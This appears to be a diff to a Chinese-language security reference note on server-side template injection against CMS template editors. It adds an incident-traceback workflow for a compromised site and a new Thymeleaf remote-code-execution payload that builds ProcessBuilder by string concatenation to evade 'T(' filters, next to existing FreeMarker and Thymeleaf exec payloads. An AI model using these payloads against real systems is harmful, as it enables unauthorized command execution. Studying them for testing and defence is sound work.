@@ -25,6 +25,8 @@
 
 **CMS「模板编辑器」形态**（PortSwigger「SSTI using documentation」类）：登录后的模板编辑器，POST 回 `?productId=N`（id 在 query 而非 body），body 只带 `csrf`+`template`+`template-action=preview|save`。三件事：先指纹再打 RCE、id 留在 query、每次取新 CSRF 且用 `preview` 快速迭代、`save` 后才触发正式渲染。
 
+> **站点已经被打过、攻击者模板还留在服务器上**（客户诉求是"被恶意注册/被入侵，帮定位漏洞"，而日志不覆盖入口）→ 别从日志正查，先读 `references/notes/ssti-cms-incident-traceback.md`：畸形请求体探鉴权分层 → 未鉴权读接口拉全量业务表反查攻击者产物 → 生成页 `java.lang.UNIXProcess@` 指纹 → 路径回显 + 公开静态目录 = 下载 payload 原件 → cmd-file 轮询后门与处置顺序。
+
 ## 3. 探测顺序（从最无害 → 最有杀伤力）
 
 1. **算术探针定位引擎**：`{{7*7}}` / `${7*7}` / `#{7*7}` / `<%= 7*7 %>` / `*{7*7}` 看哪个算成 `49`（映射见 4.1）。
@@ -135,6 +137,9 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 /* Thymeleaf 反射 + 字节数组（绕关键字） */
 ${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
 ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
+/* Thymeleaf 字符串拼接 + 实例反射：连 T( 都不出现（<ctx> = 模板上下文里任意对象；来源：notes/ssti-cms-incident-traceback.md §8.2） */
+${<ctx>.getClass().forName("java.lang.Process"+"Builder").getConstructors()[0].newInstance({"id"}).start()}
+/* 若改用 getDeclaredMethods()[N] 取 getRuntime()：下标随 JDK 浮动，先枚举，别硬编码（同 §4.5 纪律） */
 ```
 
 ```php
